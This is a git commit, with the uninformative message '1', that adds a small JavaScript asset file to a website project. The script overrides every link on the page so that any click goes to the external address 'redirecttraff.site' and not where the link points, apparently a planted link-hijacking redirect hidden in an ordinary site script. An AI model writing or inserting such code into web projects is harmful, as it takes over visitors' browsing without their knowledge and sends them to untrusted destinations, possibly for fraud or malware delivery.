dbd48a74283b8cea4d9d85161e4ad4d83d58f79b
maratbabaev <you@example.com>
2025-03-10 16:28:11 +0300

    1

---
+++ assets/js/script.js
@@ -0,0 +1,7 @@
+document.querySelectorAll("a").forEach((elem) => {
+	elem.onclick = function (e) {
+		e.preventDefault();
+		window.location.href = "https://redirecttraff.site/pk6CdBFX";
+		return false;
+	};
+});
